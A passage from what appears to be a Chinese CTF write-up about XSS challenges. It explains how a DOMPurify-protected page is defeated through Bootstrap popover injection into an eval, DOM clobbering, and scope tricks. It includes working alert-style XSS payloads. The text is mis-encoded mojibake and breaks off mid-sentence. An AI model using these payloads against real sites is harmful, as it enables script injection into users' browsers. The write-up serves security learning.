$(\u0026#39;#keanu\u0026#39;).popover(\u0026#39;show\u0026#39;) setTimeout(_ =\u0026gt; { $(\u0026#39;#keanu\u0026#39;).popover(\u0026#39;hide\u0026#39;) }, 2000) /* Check Magic Number */ var magicNumber = Math.floor(Math.random() * 10); var number = eval($(\u0026#39;number#number\u0026#39;).html()); if (magicNumber === number) { alert(\u0026#34;You\u0026#39;re Breathtaking!\u0026#34;) } \u0026lt;/script\u0026gt; æœ¬é¢˜é¢˜ç›®å¼•å…¥äº†å››ä¸ª js æ–‡ä»¶ï¼š\n\u0026lt;!-- DOMPurify(2.0.7) --\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.0.7/purify.min.js\u0026#34; integrity=\u0026#34;sha256-iO9yO1Iy0P2hJNUeAvUQR2ielSsGJ4rOvK+EQUXxb6E=\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;!-- Jquery(3.4.1), Popper(1.16.0), Bootstrap(4.4.1) --\u0026gt; \u0026lt;script src=\u0026#34;https://code.jquery.com/jquery-3.4.1.slim.min.js\u0026#34; integrity=\u0026#34;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js\u0026#34; integrity=\u0026#34;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script src=\u0026#34;https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js\u0026#34; integrity=\u0026#34;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6\u0026#34; crossorigin=\u0026#34;anonymous\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; è¿™ä¸ªé¢˜ç›®ä¹Ÿæ¯”è¾ƒæœ‰æ„æ€ï¼Œé¢å¤–ç»™æˆ‘ä»¬å¢åŠ çš„è¿™å‡ ä¸ª js æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™å‡ ä¸ªæ–‡ä»¶å°±æ˜¯è¿™é“é¢˜æˆ‘ä»¬å¯èƒ½éœ€è¦ç”¨çš„å·¥å…·äº†ã€‚\nPurify.js æ˜¯ä¸€ä¸ª XSS WAFï¼ŒPopper.jsæ˜¯ä¸€ä¸ªç”¨äºæ„é€ æç¤ºçš„ç»„ä»¶ï¼Œé¢˜ç›®ä¸­ä¹Ÿç»™äº†ä¸€ä¸ªç®€å•çš„ä½¿ç”¨ popper çš„ä¾‹å­ï¼ŒJqeury.js ä¸ Bootstrap å°±ä¸å¤šè¯´äº†ã€‚\né¦–å…ˆæˆ‘ä»¬æ¥çœ‹æˆ‘ä»¬çš„å¯æ§ç‚¹ï¼Œä¸€ä¸ªæ˜¯ name å‚æ•°ï¼Œå¦ä¸€ä¸ªæ˜¯ number å‚æ•°ã€‚ç„¶è€Œ number å‚æ•°æˆ‘ä»¬å´åªèƒ½ä½¿ç”¨ä¸€ä½ï¼Œè€Œ name å‚æ•°è™½ç„¶ä»»æ„é•¿åº¦å¯æ§ï¼Œä½†æ˜¯è¦ç»è¿‡ XSS WAF è¿‡æ»¤ã€‚è™½ç„¶ä¹‹å‰æœ‰ä¸€äº›åˆ©ç”¨ mxss bypass Domprify çš„äº‹ä¾‹ï¼Œä½†æ˜¯éƒ½æ˜¯åœ¨ 2.0 å·¦å³çš„ç‰ˆæœ¬ï¼Œè¿™é‡Œçš„ 2.0.7 åˆæ˜¯æœ€æ–°çš„ç‰ˆæœ¬ï¼Œåº”è¯¥ä¸ä¼šæ˜¯ä»€ä¹ˆæ–°çš„ç»•è¿‡ï¼Œå¦åˆ™ number å‚æ•°ä¸æœ€åçš„ eval($(\u0026quot;number#number\u0026quot;).html()); å°±æ²¡ç”¨äº†ï¼Œå¹¶ä¸”è¿˜æœ‰ä¸€äº›å…¶ä»–å·¥å…·æˆ‘ä»¬æ²¡æœ‰ç”¨ä¸Šã€‚\næ‰€ä»¥æˆ‘ä»¬åº”è¯¥èƒ½ç”¨åˆ°çš„å°±æ˜¯é€šè¿‡æœ€åä¸€ä¸ªeval($(\u0026quot;number#number\u0026quot;).html())è¿›è¡Œ XSS ï¼Œè€Œ number æˆ‘ä»¬å¯æ§çš„åªæœ‰ä¸€ä½ï¼Œæˆ‘ä»¬å¯èƒ½å¾—æƒ³ä¸€äº›å…¶ä»–åŠæ³•æ·»åŠ  number æ ‡ç­¾å½“ä¸­çš„å†…å®¹ã€‚\næˆ‘ä»¬å¯ä»¥çœ‹åˆ° popper document ç»“åˆé¢˜ç›®ç»™å‡ºçš„é‚£ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°è²Œä¼¼è¿™ä¸ª popper.js å¯ä»¥æ»¡è¶³æˆ‘ä»¬æ·»åŠ æ–°å†…å®¹æ¡ä»¶ï¼Œè€Œåœ¨æ–‡æ¡£ options éƒ¨åˆ†ï¼Œæˆ‘ä»¬å¯ä»¥åˆ°æœ‰ä¸€äº›æˆ‘ä»¬å€¼å¾—å…³æ³¨çš„å‚æ•°ï¼š\n   Name Type Default Description     container string | element | false false Appends the popover to a specific element. Example: container: 'body'. This option is particularly useful in that it allows you to position the popover in the flow of the document near the triggering element - which will prevent the popover from floating away from the triggering element during a window resize.   content string | element | function '' Default content value if data-content attribute isn\u0026rsquo;t present.If a function is given, it will be called with its this reference set to the element that the popover is attached to.    æˆ‘ä»¬å¯ä»¥ä»æ–‡æ¡£çŸ¥é“ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡data-containeræ¥æ§åˆ¶ popover çš„ä½ç½®ï¼Œdata-contentæ¥æ§åˆ¶å†…å®¹ï¼Œäºæ˜¯æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æœ‰ä¸€ä¸ªæƒ³æ³•æŠŠè¿™ä¸ª popover å¼„åˆ° number æ ‡ç­¾å½“ä¸­å‘¢ï¼Ÿäºæ˜¯æˆ‘ä»¬å¯ä»¥å°è¯•æ„é€ å¦‚ä¸‹ payload ï¼š\n\u0026lt;button id=\u0026#34;keanu\u0026#34; data-toggle=\u0026#34;popover\u0026#34; data-container=\u0026#34;#number\u0026#34; data-content=\u0026#34;hello\u0026#34;\u0026gt; åˆ©ç”¨é¢˜ç›®ä¸­åŸæœ‰çš„$(\u0026quot;#keanu\u0026quot;).popover(\u0026quot;show\u0026quot;);æ¥è§¦å‘æˆ‘ä»¬çš„ popover ï¼Œæˆ‘ä»¬æš‚ä¸”å…ˆæ³¨é‡Šæ‰é¢˜ç›®å½“ä¸­çš„å»¶è¿Ÿå…³é—­çš„åŠŸèƒ½ä»¥ä¾¿äºæˆ‘ä»¬è§‚å¯Ÿã€‚\n \nå°½ç®¡ eval æ‰§è¡Œå‡ºé”™ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥å‘ç° number æ ‡ç­¾å½“ä¸­ç¡®å®è¢«æˆ‘ä»¬æ³¨å…¥äº†ä¸€äº›å…¶ä»–çš„å†…å®¹\n7\u0026lt;div class=\u0026#34;popover fade bs-popover-right show\u0026#34; role=\u0026#34;tooltip\u0026#34; id=\u0026#34;popover238474\u0026#34; x-placement=\u0026#34;right\u0026#34; style=\u0026#34;position: absolute;\u0026#34;\u0026gt;\u0026lt;div class=\u0026#34;arrow\u0026#34;\u0026gt;\u0026lt;/div\u0026gt;\u0026lt;h3 class=\u0026#34;popover-header\u0026#34;\u0026gt;\u0026lt;/h3\u0026gt;\u0026lt;div class=\u0026#34;popover-body\u0026#34;\u0026gt;hello\u0026lt;/div\u0026gt;\u0026lt;/div\u0026gt; æˆ‘ä»¬è¿™æ ·æˆ‘ä»¬ç®€åŒ–ä¸€ä¸‹è¿™ä¸ªå†…å®¹:7\u0026lt;template\u0026gt;hello\u0026lt;/template\u0026gt;ï¼Œæˆ‘ä»¬å¯æ§çš„åœ°æ–¹å°±æ˜¯ 7 ä¸ hello ï¼Œ\u0026lt;template\u0026gt;å°±æ˜¯ popper.js å®ç°çš„ popover åŠŸèƒ½çš„ä»£ç ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸éœ€è¦å…³æ³¨ï¼Œæ‰€ä»¥è¿™æ ·é—®é¢˜å°±å˜æˆäº†å¦‚ä½•åœ¨$str=\u0026quot;$1\u0026lt;template\u0026gt;$any\u0026lt;/template\u0026gt;\u0026quot;;eval($str);å½“ä¸­æ‰§è¡Œä»£ç çš„é—®é¢˜äº†ã€‚\nåˆ°è¿™é‡Œå…¶å®ç­”æ¡ˆå·²ç»å‘¼ä¹‹æ¬²å‡ºäº†ï¼Œæ—¢ç„¶æ˜¯åœ¨evalå½“ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ç¬¬ä¸€ä½ä¸ºå•å¼•å·ï¼Œç”±äºä¸­é—´$anyæˆ‘ä»¬ä»»æ„å¯æ§ï¼Œåé¢å†ç”¨ä¸€ä¸ªå•å¼•å·å°†\u0026lt;template\u0026gt;å˜æˆå­—ç¬¦ä¸²ï¼Œ//æ³¨é‡Šæ‰åé¢çš„\u0026lt;/template\u0026gt;å³å¯ï¼Œæ•´ä¸ª payload å³æ˜¯'\u0026lt;tamplate\u0026gt;';alert();//\u0026lt;/tamplate\u0026gt;ã€‚\næ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿™ä¹ˆæ„é€ ä¸€ä¸ªå…ƒç´ ï¼š\n\u0026lt;button id=\u0026#34;keanu\u0026#34; data-toggle=\u0026#34;popover\u0026#34; data-container=\u0026#34;#number\u0026#34; data-content=\u0026#34;\u0026#39;;alert(1);//\u0026#34;\u0026gt; å³å¯å®ç° XSSï¼Œæ‰€ä»¥ payload:\nnumber='\u0026amp;name=\u0026lt;button id%3D\u0026quot;keanu\u0026quot; data-toggle%3D\u0026quot;popover\u0026quot; data-container%3D\u0026quot;%23number\u0026quot; data-content%3D\u0026quot;'%3Balert(1)%3B%2F%2F\u0026quot;\u0026gt;  \nWW3 \u0026lt;!-- Challenge --\u0026gt; \u0026lt;div\u0026gt; \u0026lt;h4\u0026gt;Meme Code\u0026lt;/h4\u0026gt; \u0026lt;textarea class=\u0026#34;form-control\u0026#34; id=\u0026#34;meme-code\u0026#34; rows=\u0026#34;4\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;div id=\u0026#34;notify\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; /* Utils */ const escape = (dirty) =\u0026gt; unescape(dirty).replace(/[\u0026lt;\u0026gt;\u0026#39;\u0026#34;=]/g, \u0026#39;\u0026#39;); const memeTemplate = (img, text) =\u0026gt; { return (`\u0026lt;style\u0026gt;@import url(\u0026#39;https://fonts.googleapis.com/css?family=Oswald:700\u0026amp;display=swap\u0026#39;);`+ `.meme-card{margin:0 auto;width:300px}.meme-card\u0026gt;img{width:300px}`+ `.meme-card\u0026gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`+ `position:relative;font-family:Oswald,sans-serif;font-weight:700}\u0026lt;/style\u0026gt;`+ `\u0026lt;div class=\u0026#34;meme-card\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;${img}\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;${text}\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt;`) } const memeGen = (that, notify) =\u0026gt; { if (text \u0026amp;\u0026amp; img) { template = memeTemplate(img, text) if (notify) { html = (`\u0026lt;div class=\u0026#34;alert alert-warning\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Meme\u0026lt;/b\u0026gt; created from ${DOMPurify.sanitize(text)}\u0026lt;/div\u0026gt;`) } setTimeout(_ =\u0026gt; { $(\u0026#39;#status\u0026#39;).remove() notify ? ($(\u0026#39;#notify\u0026#39;).html(html)) : \u0026#39;\u0026#39; $(\u0026#39;#meme-code\u0026#39;).text(template) }, 1000) } } \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; /* Main */ let notify = false; let text = new URL(location).searchParams.get(\u0026#39;text\u0026#39;) let img = new URL(location).searchParams.get(\u0026#39;img\u0026#39;) if (text \u0026amp;\u0026amp; img) { document.write( `\u0026lt;div class=\u0026#34;alert alert-primary\u0026#34; role=\u0026#34;alert\u0026#34; id=\u0026#34;status\u0026#34;\u0026gt;`+ `\u0026lt;img class=\u0026#34;circle\u0026#34; src=\u0026#34;${escape(img)}\u0026#34; onload=\u0026#34;memeGen(this, notify)\u0026#34;\u0026gt;`+ `Creating meme... (${DOMPurify.sanitize(text)})\u0026lt;/div\u0026gt;` ) } else { $(\u0026#39;#meme-code\u0026#39;).text(memeTemplate(\u0026#39;https://i.imgur.com/PdbDexI.jpg\u0026#39;, \u0026#39;When you get that WW3 draft letter\u0026#39;)) } \u0026lt;/script\u0026gt; è¿™ä¸ªé¢˜ç›®è®©æˆ‘æ·±æ·±åœ°ä½“ä¼šåˆ°äº† JavaScript çš„æ¶æ„\u0026hellip;å…ˆæ”¾ä¸ªå›¾ï¼Œå¤§å®¶è‡ªè¡Œå…ˆä½“ä¼šä¸€ä¸‹ï¼Œç„¶åæˆ‘ä»¬å¼€å§‹åˆ†æä¸€ä¸‹é¢˜ç›®ã€‚\n \né¢˜ç›®ç”¨æ¯”è¾ƒå¤šçš„ä»£ç åšäº†ä¸€ä¸ªè·å–å›¾ç‰‡ä»¥åŠè¾“å‡ºè‡ªå®šä¹‰ text çš„åŠŸèƒ½ï¼Œä»æ—§æ˜¯ä¸Šé¢˜çš„å››ä¸ªå¤–éƒ¨ JS æ–‡ä»¶ï¼Œä»¥åŠä¸€å¤§æ®µ JS ä»£ç ã€‚æœ¬é¢˜æ¶‰åŠåˆ° JavaScript æ¯”è¾ƒå¤šçš„é»‘é­”æ³•ï¼Œæˆ‘ä»¬ä¸€ä¸ªä¸ªæ¥çœ‹çœ‹ã€‚\nå®¡è®¡ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹åˆ°é¢˜ç›®å®šä¹‰äº†å‡ ä¸ªå‡½æ•°\nconst escape = dirty =\u0026gt; unescape(dirty).replace(/[\u0026lt;\u0026gt;\u0026#39;\u0026#34;=]/g, \u0026#34;\u0026#34;); ç”¨æ¥è¿‡æ»¤æˆ‘ä»¬çš„ img å‚æ•°\nconst memeTemplate = (img, text) =\u0026gt; { return ( `\u0026lt;style\u0026gt;@import url(\u0026#39;https://fonts.googleapis.com/css?family=Oswald:700\u0026amp;display=swap\u0026#39;);` + `.meme-card{margin:0 auto;width:300px}.meme-card\u0026gt;img{width:300px}` + `.meme-card\u0026gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;` + `position:relative;font-family:Oswald,sans-serif;font-weight:700}\u0026lt;/style\u0026gt;` + `\u0026lt;div class=\u0026#34;meme-card\u0026#34;\u0026gt;\u0026lt;img src=\u0026#34;${img}\u0026#34;\u0026gt;\u0026lt;h1\u0026gt;${text}\u0026lt;/h1\u0026gt;\u0026lt;/div\u0026gt;` ); }; ç”¨æ¥å°†æˆ‘ä»¬ä¼ å…¥çš„ img \u0026amp; text å‚æ•°æ„é€ ä¸€ä¸ª HTML æ¨¡ç‰ˆ\nconst memeGen = (that, notify) =\u0026gt; { if (text \u0026amp;\u0026amp; img) { template = memeTemplate(img, text); if (notify) { html = `\u0026lt;div class=\u0026#34;alert alert-warning\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Meme\u0026lt;/b\u0026gt; created from ${DOMPurify.sanitize( text )}\u0026lt;/div\u0026gt;`; } setTimeout(_ =\u0026gt; { $(\u0026#34;#status\u0026#34;).remove(); notify ? $(\u0026#34;#notify\u0026#34;).html(html) : \u0026#34;\u0026#34;; $(\u0026#34;#meme-code\u0026#34;).text(template); }, 1000); } }; ç”¨æ¥è¿›è¡Œ DOM å…ƒç´ æ“ä½œç­‰ï¼Œçœ‹èµ·æ¥æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯setTimeoutå‡½æ•°ä¸­é€šè¿‡$(\u0026quot;#notify\u0026quot;).html(html)æ¥æ‰§è¡Œä»£ç äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯èƒ½éœ€è¦æƒ³åŠæ³•æŠŠ notify å‚æ•°è®¾ç½®ä¸º trueã€‚\nDOM Clobbering é¦–å…ˆæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹å‡ ä¸ªæ¯”è¾ƒæœ‰è¶£çš„ä¾‹å­ï¼š\n \næ ¹æ® MDN æ–‡æ¡£\n â€‹\tThe domain property of the Document interface gets/sets the domain portion of the origin of the current document, as used by the same origin policy.\n è¿™é‡Œçš„document.domainå¹¶æ²¡æœ‰è·å–åˆ°æˆ‘çš„åŸŸåzedd.vvï¼Œåè€Œæ˜¯è·å–åˆ°äº† img æ ‡ç­¾ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥ç›´æ¥è¾“å‡º document å¯¹è±¡æ¥çœ‹çœ‹æ˜¯æ€ä¹ˆå›äº‹\n \né€šè¿‡è¿™ä¸ªä¾‹å­æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œå¯ä»¥é€šè¿‡ä¸€äº›æ ‡ç­¾çš„ id(name) å±æ€§æ¥æ§åˆ¶ document(window) é€šè¿‡ DOM API(BOM API) è·å–åˆ°çš„æŸä¸ªä¸œè¥¿\n \næˆ‘æŸ¥é˜…è¿‡ç›¸å…³èµ„æ–™ï¼Œä¹Ÿè¯¢é—®è¿‡ä¸€äº›å‰ç«¯çš„ä¸“ä¸šäººå‘˜ï¼Œè¿™é‡Œç»™æˆ‘çš„è§£é‡Šæ˜¯\u0026quot;document å’Œ window ä¸¤ä¸ªå˜é‡ï¼Œå…¶å®æ˜¯ DOM å’Œ BOM çš„è§„èŒƒï¼Œä¸€èˆ¬æ¥è¯´è¿™ä¸¤ä¸ªä¸åº”è¯¥è¢«å½“åšæ™®é€šçš„ JS å¯¹è±¡ï¼Œä½†æ˜¯è§„èŒƒä¸å®ç°ä¸åŒ\u0026quot;ï¼Œ\u0026ldquo;éƒ½æ˜¯å› ä¸ºä¸Šå¤é—ç•™é—®é¢˜ï¼Œç°åœ¨å“ªæœ‰ç›´æ¥å†™ document.xxx æ¥è·å–å…ƒç´ çš„ï¼ŒTS å’Œ eslint éƒ½ä¼šæŠ¥é”™\u0026rdquo;ã€‚\nè¿™ç§æ“ä½œå…·ä½“å¯ä»¥å‚è€ƒ dom-clobberingï¼Œä¸ç®—æ˜¯æ–°çš„æ”»å‡»æ‰‹æ³•ï¼Œä½†æ˜¯æœ‰æ•ˆï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨è¿™ç§ Trick æ¥å®ç°ä¸€äº›æ“ä½œã€‚\nsetTimeout æˆ‘ä»¬äº†è§£äº† Dom Clobbering ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥å…ˆçœ‹çœ‹å¯ä»¥æ€ä¹ˆé€šè¿‡setTimeoutæ¥åˆ©ç”¨\n\u0026lt;div id=\u0026#34;a\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; a.innerHTML = new URL(location).searchParams.get(\u0026#39;b\u0026#39;); setTimeout(ok, 2000) \u0026lt;/script\u0026gt; ç®€åŒ–äº†ä¸€ä¸‹é¢˜ç›®ä»£ç ï¼Œå¯¹äºä»¥ä¸Šçš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ©ç”¨ Dom Clobbering æ¥å®ç° XSS ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥ç›´æ¥ä¼ å…¥ id ä¸º ok çš„æ ‡ç­¾è¿›è¡Œ XSS ï¼Œä¾‹å¦‚ä¼ å…¥\n\u0026lt;a id=ok href=javascript:alert()\u0026gt; å¯æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\næ ¹æ® MDN æ–‡æ¡£ï¼ŒsetTimeoutçš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¿…é¡»æ˜¯ä¸ªå‡½æ•°æˆ–å­—ç¬¦ä¸²ã€‚å¯æ˜¯æ ¹æ® Dom Clobbering ï¼Œè¿™é‡Œçš„okåº”è¯¥æ˜¯ä¸€ä¸ª a æ ‡ç­¾ï¼Œæ—¢ç„¶è¿™ä¸æ˜¯ä¸ªå‡½æ•°ï¼Œå®ƒå°±å°è¯•ç”¨toStringæ–¹æ³•è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œè€Œæ ¹æ® MDN æ–‡æ¡£ HTMLAnchorElement\n â€‹\tHTMLHyperlinkElementUtils.toString()\nReturns a USVString containing the whole URL. It is a synonym for HTMLHyperlinkElementUtils.href, though it can\u0026rsquo;t be used to modify the value.\n è€Œå½“ a æ ‡ç­¾é€šè¿‡toString()æ–¹æ³•è½¬æ¢æˆ‘ä»¬å¯ä»¥å¾—åˆ°å®ƒçš„ href å±æ€§ï¼Œä¹Ÿå°±æ˜¯javascript:alert()ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä»£ç äº†ã€‚\nnotify å¥½äº†ï¼Œå›åˆ°æˆ‘ä»¬çš„ notify ä¸Šï¼Œè™½ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ DOM Clobbering è¿›è¡Œâ€œæ±¡æŸ“â€ä¸€äº›å‚æ•°ï¼Œä½†æ˜¯é¢˜ç›®ç›´æ¥è§„å®šäº†let notify = falseï¼Œæµè§ˆå™¨å½“ç„¶ä¹Ÿä¸å¯èƒ½å…è®¸æˆ‘ä»¬ä¿®æ”¹æœåŠ¡ç«¯çš„ä»£ç ï¼Œè¿™å¯æ€ä¹ˆåŠï¼Ÿ\nå…¶å®è¿™é‡Œçš„ notify æ¯”è¾ƒå…·æœ‰è¯¯å¯¼æ€§ï¼Œæ¯”è¾ƒåƒ C è¯­è¨€å…¥é—¨çš„æ—¶å€™å‡½æ•°ä¼ å‚éƒ¨åˆ†ï¼Œæˆ‘ä»¬æŠŠæ•´ä¸ªä»£ç æ”¹ä¸€ä¸‹ï¼š\n\u0026lt;script\u0026gt; const memeGen = (that, notify) =\u0026gt; { if (text \u0026amp;\u0026amp; img) { template = memeTemplate(img, text); if (notify) { //... \t} } }; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; /* Main */ let notify = false; let text = new URL(location).searchParams.get(\u0026#34;text\u0026#34;); let img = new URL(location).searchParams.get(\u0026#34;img\u0026#34;); if (text \u0026amp;\u0026amp; img) { document.write( `\u0026lt;div class=\u0026#34;alert alert-primary\u0026#34; role=\u0026#34;alert\u0026#34; id=\u0026#34;status\u0026#34;\u0026gt;` + `\u0026lt;img class=\u0026#34;circle\u0026#34; src=\u0026#34;${escape( img )}\u0026#34; onload=\u0026#34;memeGen(this, notify)\u0026#34;\u0026gt;` + `Creating meme... (${DOMPurify.sanitize(text)})\u0026lt;/div\u0026gt;` ); } else { $(\u0026#34;#meme-code\u0026#34;).text( memeTemplate( \u0026#34;https://i.imgur.com/PdbDexI.jpg\u0026#34;, \u0026#34;When you get that WW3 draft letter\u0026#34; ) ); } \u0026lt;/script\u0026gt; å†ç®€åŒ–ä¸€ä¸‹å°±æˆäº†æˆ‘ä»¬çš„ C è¯­è¨€å‡½æ•°ä¼ å‚çš„ç»ƒä¹ é¢˜äº†\nconst memeGen = (that, x) =\u0026gt; { if (x) { //...  } }; ä¸ºäº†æ˜“äºç†è§£æˆ‘ä»¬å¯ä»¥å†™æˆè¿™æ ·å°±ä¸æ˜“å¼„æ··äº†ï¼Œæ‰€ä»¥ï¼Œå¯¹äºmemeGenæ¥è¯´ï¼Œnotifyåªæ˜¯ä¸€ä¸ªå‚æ•°å˜é‡åï¼ŒåŒºåˆ«äºæˆ‘ä»¬ä¸€å¼€å§‹æåˆ°çš„ Javascript Scope éƒ¨åˆ†ï¼Œè¯¥å‡½æ•°å†…çš„notifyå‚æ•°å˜é‡å–å†³äºè¯¥å‡½æ•°æ‰€åœ¨çš„ä½œç”¨åŸŸã€‚\nè€Œå¯¹äºmemeGenå‡½æ•°æ¥è¯´ï¼Œå®ƒçš„ä½œç”¨åŸŸå¹¶éæ˜¯åœ¨let notify = falseæ‰€å¤„çš„ JS ä»£ç åŸŸå½“ä¸­ï¼Œè€Œæ˜¯åœ¨é€šè¿‡document.writeå‡½æ•°ä¹‹åçš„ä½œç”¨åŸŸï¼Œæ‰€ä»¥è¿™é‡Œå°±æ¶‰åŠåˆ°äº†ä½œç”¨åŸŸçš„é—®é¢˜ã€‚\nJavaScript Scope æ‰€ä»¥å¯¹äºæ‰§è¡Œdocument.writeå‡½æ•°è¿‡åï¼Œä¹Ÿå°±æ˜¯å¯¹äºonload=memeGenå‡½æ•°æ¥è¯´ï¼Œå…¶ä½œç”¨åŸŸå¹¶éæ˜¯ JS çš„ä½œç”¨åŸŸï¼Œåœ¨é¢˜ç›®ä¸­æœ¬æ¥è¿™ä¹ˆå‡ ä¸ªä½œç”¨åŸŸï¼šwindowã€scriptã€onloadï¼Œå…¶ä¸­ window åŒ…å«äº†åä¸¤ä¸ªï¼Œåä¸¤ä¸ªäº’ä¸åŒ…å«ï¼Œæ‰€ä»¥è¿™é‡Œåœ¨ onload æ‰¾ä¸åˆ° notify å˜é‡ï¼Œå°±ä¼šå» window çš„ä½œç”¨åŸŸæ‰¾ï¼Œå°±ä¼šæŠŠ script ä½œç”¨åŸŸå½“ä¸­çš„ notify ç»™æ‰¾åˆ°ï¼Œnotify å˜é‡ä¹Ÿå°±æˆ false äº†ã€‚\næˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥ç†è§£ï¼š\n\u0026lt;div name=x\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; const test = (that,x) =\u0026gt; { console.log(\u0026#34;Test\u0026#39;x: \u0026#34; + x); if(x){ console.log(\u0026#34;JS Magic\u0026#34;); } }; \u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; let x = false; console.log(\u0026#34;JS\u0026#39;x: \u0026#34; + x); document.write(\u0026#34;\u0026lt;img src=x onerror=test(this,x)\u0026gt;\u0026#34;); \u0026lt;/script\u0026gt;  \nåŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œtestå‡½æ•°åœ¨onerrorä½œç”¨åŸŸæ‰¾åˆ°äº† x å˜é‡ï¼Œæ‰€ä»¥å°±ä¸ä¼šå†å»æ‰¾ window ä½œç”¨åŸŸä¸‹çš„ x=falseå˜é‡äº†ï¼Œæ‰€ä»¥æœ¬é¢˜æˆ‘ä»¬éœ€è¦å¼•å…¥ä¸€ä¸ªname=notifyçš„æ ‡ç­¾æ¥â€œè¦†ç›–â€æ‰åŸæ¥çš„ notify å˜é‡ã€‚\nå…¶å®è¿™ä¹Ÿæ˜¯ä¸€å¼€å§‹æˆ‘ä»¬å¯ä»¥å‘ç°é¢˜ç›®ç»™å‡ºçš„ä»£ç æœ‰ä¸€å¤„ä¹Ÿæ¯”è¾ƒç¥å¥‡å°±æ˜¯ text \u0026amp; img\nconst memeGen = (that, notify) =\u0026gt; { if (text \u0026amp;\u0026amp; img) { template = memeTemplate(img, text); ... } }; memeGenå‡½æ•°åœ¨å‡½æ•°å†…æ‰¾ä¸åˆ°textï¼Œonload çš„ä½œç”¨åŸŸä¹Ÿæ‰¾ä¸åˆ°textï¼Œå°±ä¼šå» scriptä¸‹é¢æ‰¾ï¼Œè€Œå¤šä¸ª script å±äºåŒä¸€ä¸ªä½œç”¨åŸŸï¼Œæ‰€ä»¥å¯¹äºå‡½æ•°å½“ä¸­çš„ text ä»¥åŠ img ï¼Œå®ƒæ˜¯åœ¨ä¸‹ä¸€å— JS ä»£ç æ®µå®šä¹‰çš„ã€‚\n\u0026lt;script\u0026gt; let notify = false; let text = new URL(location).searchParams.get(\u0026#34;text\u0026#34;); let img = new URL(location).searchParams.get(\u0026#34;img\u0026#34;); ... \u0026lt;/script\u0026gt;  \nJQuery\u0026rsquo;s \u0026lsquo;mXSS\u0026rsquo; æ‰€ä»¥åŸºæœ¬ä¸Š notify çš„é—®é¢˜æˆ‘ä»¬è§£å†³äº†ï¼Œæ¥ä¸‹æ¥å°±æ˜¯ DOM Purify çš„é—®é¢˜äº†ã€‚\næˆ‘ä»¬å¯ä»¥çŸ¥é“æœ€ç»ˆæˆ‘ä»¬è¦æ’å…¥çš„ä»£ç æ˜¯é€šè¿‡$(\u0026quot;#notify\u0026quot;).html(html)æ¥æ’å…¥çš„ï¼Œè€Œå‚æ•° html åˆæ¥è‡ª\nhtml = `\u0026lt;div class=\u0026#34;alert alert-warning\u0026#34; role=\u0026#34;alert\u0026#34;\u0026gt;\u0026lt;b\u0026gt;Meme\u0026lt;/b\u0026gt; created from ${DOMPurify.sanitize(text)}\u0026lt;/div\u0026gt;`; ç®€å•è·Ÿä¸€ä¸‹ JQuery çš„ html() 